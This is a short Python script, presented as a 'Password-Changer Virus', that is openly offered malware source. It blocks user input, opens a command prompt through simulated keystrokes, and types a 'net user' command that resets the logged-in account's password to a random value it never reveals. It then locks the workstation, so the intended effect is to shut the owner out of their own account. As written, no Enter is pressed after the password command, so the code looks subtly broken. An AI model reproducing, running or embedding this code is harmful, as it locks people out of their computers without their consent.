# Password-Changer Virus
# By Confused Character
# github https://github.com/ConfusedCharacter/Python-Virus/
#
# pip3 install pyautogui

from ctypes import *
import pyautogui
import random
import os

windll.user32.BlockInput(True)
pyautogui.keyDown('winleft')
pyautogui.press('r')
pyautogui.keyUp('winleft')
pyautogui.write("cmd")
pyautogui.press("enter")
password = "".join(random.choices("ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcdefghijklmnopqrstuvwxyz",k=14))
user = os.getlogin()
pyautogui.write(f"net user {user} {password}")
windll.user32.LockWorkStation()

# please be sure then run source



#█▀▀ █▀█ █▄░█ █▀▀ █░█ █▀ █▀▀ █▀▄   █▀▀ █░█ ▄▀█ █▀█ ▄▀█ █▀▀ ▀█▀ █▀▀ █▀█
#█▄▄ █▄█ █░▀█ █▀░ █▄█ ▄█ ██▄ █▄▀   █▄▄ █▀█ █▀█ █▀▄ █▀█ █▄▄ ░█░ ██▄ █▀▄
